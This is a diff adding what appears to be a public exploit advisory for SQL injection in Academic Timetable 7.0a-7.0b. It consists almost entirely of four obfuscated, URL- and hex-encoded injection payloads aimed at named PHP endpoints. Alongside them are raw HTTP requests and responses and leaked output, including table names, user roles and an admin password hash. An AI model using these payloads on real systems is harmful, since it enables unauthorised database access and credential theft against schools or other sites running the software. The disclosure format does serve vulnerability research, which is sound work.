@@ -1,0 +1,101 @@
+# Exploit Title: Academic Timetable Final Build 7.0a-7.0b - 'id' SQL Injection
+# Dork: N/A
+# Date: 2018-10-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://geoffpartridge.net/
+# Software Link: https://sourceforge.net/projects/timetableacademic/files/latest/download
+# Version: 7.0a-7.0b
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/timetable_pdf_content.php?master=facility&id=[SQL]
+
+-66'%20%20/*!11111unIoN*/%20%20/*!11111sElEcT*/%200x3636%2c0x3636%2c0x3636%2c0x3636%2c0x3636%2c0x3636%2c(/*!11111SelEct*/%20ConCat%20(@:=0%2c(/*!11111SelEct*/%20CoUnt(*) /*!11111frOm*/%20/*!11111inFORmation_schema.tables*/%20/*!11111wHerE*/(TabLE_SCheMA!=0x696e666f726d6174696f6e5f736368656d61)anD@:=ConCat%20(@%2c0x3c62723e%2c/*!11111table_name*/))%2c@))%2c0x3636%2c0x3636%2c0x3636%2c0x3636--%20%20-
+ 
+http://192.168.1.27/[PATH]/timetable_pdf_content.php?master=facility&id=-66%27%20%20/*!11111unIoN*/%20%20/*!11111sElEcT*/%200x3636%2c0x3636%2c0x3636%2c0x3636%2c0x3636%2c0x3636%2c(/*!11111SelEct*/%20ConCat%20(@:=0%2c(/*!11111SelEct*/%20CoUnt(*)%20/*!11111frOm*/%20/*!11111inFORmation_schema.tables*/%20/*!11111wHerE*/(TabLE_SCheMA!=0x696e666f726d6174696f6e5f736368656d61)anD@:=ConCat%20(@%2c0x3c62723e%2c/*!11111table_name*/))%2c@))%2c0x3636%2c0x3636%2c0x3636%2c0x3636--%20%20-
+
+GET /[PATH]/timetable_pdf_content.php?master=facility&id=-66%27%20%20/*!11111unIoN*/%20%20/*!11111sElEcT*/%200x3636%2c0x3636%2c0x3636%2c0x3636%2c0x3636%2c0x3636%2c(/*!11111SelEct*/%20ConCat%20(@:=0%2c(/*!11111SelEct*/%20CoUnt(*)%20/*!11111frOm*/%20/*!11111inFORmation_schema.tables*/%20/*!11111wHerE*/(TabLE_SCheMA!=0x696e666f726d6174696f6e5f736368656d61)anD@:=ConCat%20(@%2c0x3c62723e%2c/*!11111table_name*/))%2c@))%2c0x3636%2c0x3636%2c0x3636%2c0x3636--%20%20- HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Fri, 13 Oct 2018 01:20:12 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/timetable_pdf.php?master=facility&id=[SQL]
+
+-66'%20%20/*!11111unIoN*/%20%20/*!11111sElEcT*/%200x3636%2c0x3636%2c0x3636%2c0x3636%2c0x3636%2c0x3636%2c%28%53%45%4c%45%43%54%20%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%75%73%65%5f%69%64%2c%30%78%33%61%2c%75%73%65%5f%6e%61%6d%65%2c%30%78%33%61%2c%72%6f%6c%5f%69%64%2c%30%78%33%61%2c%70%77%64%20%53%45%50%41%52%41%54%4f%52%20%30%78%33%63%36%32%37%32%33%65%29%20%46%52%4f%4d%20%6d%73%5f%75%73%65%72%29%2c0x3636%2c0x3636%2c0x3636%2c0x3636--%20%20-
+
+Pdf File: -66'  __!11111unIoN__  __!11111sElEcT__ .......--.pdf
+BT 34.016 451.893 Td /F2 12.0 Tf  [(Notice)] TJ ET
+BT 70.688 451.893 Td /F1 12.0 Tf  [(: Undefined index: db_id in )] TJ ET
+BT 216.104 451.893 Td /F2 12.0 Tf  [([PATH]\\timetable_pdf_content.php)] TJ ET
+BT 786.236 451.893 Td /F1 12.0 Tf  [( on )] TJ ET
+BT 34.016 437.241 Td /F1 12.0 Tf  [(line )] TJ ET
+BT 56.024 437.241 Td /F2 12.0 Tf  [(157)] TJ ET
+BT 34.016 408.189 Td /F2 12.0 Tf  [(Notice)] TJ ET
+BT 70.688 408.189 Td /F1 12.0 Tf  [(: Undefined variable: master_name in )] TJ ET
+BT 34.016 393.537 Td /F2 12.0 Tf  [([PATH]\\timetable_pdf_content.php)] TJ ET
+BT 604.148 393.537 Td /F1 12.0 Tf  [( on line )] TJ ET
+BT 646.172 393.537 Td /F2 12.0 Tf  [(198)] TJ ET
+BT 34.016 378.885 Td /F2 12.0 Tf  [(Facility : [STAFF:Staff:VIEW:)] TJ ET
+BT 34.016 364.233 Td /F2 12.0 Tf  [(STUDENT:Student:VIEW:)] TJ ET
+BT 34.016 349.581 Td /F2 12.0 Tf  [(ADMIN:admin:ADMIN:*4ACFE3202A5FF5CF467898FC58AAB1D615029441])] TJ ET
+1.000 1.000 1.000 rg
+
+# POC: 
+# 3)
+# http://192.168.1.27/[PATH]/server_user.php?iDisplayStart=1[SQL]
+
+%20%2f%2a%21%35%30%30%30%30%50%72%6f%63%65%64%75%72%65%2a%2f%20%2f%2a%21%35%30%30%30%30%41%6e%61%6c%79%73%65%2a%2f%20%28%65%78%74%72%61%63%74%76%61%6c%75%65%28%30%2c%2f%2a%21%35%30%30%30%30%63%6f%6e%63%61%74%2a%2f%28%30%78%32%37%2c%30%78%33%61%2c%40%40%76%65%72%73%69%6f%6e%29%29%2c%30%29%2d%2d%20%2d%20
+
+GET /[PATH]/server_user.php?iDisplayStart=0%20%2f%2a%21%35%30%30%30%30%50%72%6f%63%65%64%75%72%65%2a%2f%20%2f%2a%21%35%30%30%30%30%41%6e%61%6c%79%73%65%2a%2f%20%28%65%78%74%72%61%63%74%76%61%6c%75%65%28%30%2c%2f%2a%21%35%30%30%30%30%63%6f%6e%63%61%74%2a%2f%28%30%78%32%37%2c%30%78%33%61%2c%40%40%76%65%72%73%69%6f%6e%29%29%2c%30%29%2d%2d%20%2d%20 HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Fri, 13 Oct 2018 01:32:02 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1408
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 4)
+# http://192.168.1.27/[PATH]/server_user.php?iDisplayStart=0&iDisplayLength=1[SQL]
+
+%20%2f%2a%21%35%30%30%30%30%50%72%6f%63%65%64%75%72%65%2a%2f%20%2f%2a%21%35%30%30%30%30%41%6e%61%6c%79%73%65%2a%2f%20%28%65%78%74%72%61%63%74%76%61%6c%75%65%28%30%2c%2f%2a%21%35%30%30%30%30%63%6f%6e%63%61%74%2a%2f%28%30%78%32%37%2c%30%78%33%61%2c%40%40%76%65%72%73%69%6f%6e%29%29%2c%30%29%2d%2d%20%2d%20
+
+GET /[PATH]/server_user.php?iDisplayStart=0&iDisplayLength=10%20%2f%2a%21%35%30%30%30%30%50%72%6f%63%65%64%75%72%65%2a%2f%20%2f%2a%21%35%30%30%30%30%41%6e%61%6c%79%73%65%2a%2f%20%28%65%78%74%72%61%63%74%76%61%6c%75%65%28%30%2c%2f%2a%21%35%30%30%30%30%63%6f%6e%63%61%74%2a%2f%28%30%78%32%37%2c%30%78%33%61%2c%40%40%76%65%72%73%69%6f%6e%29%29%2c%30%29%2d%2d%20%2d%20 HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Fri, 13 Oct 2018 01:42:25 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1062
+Keep-Alive: timeout=5, max=94
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
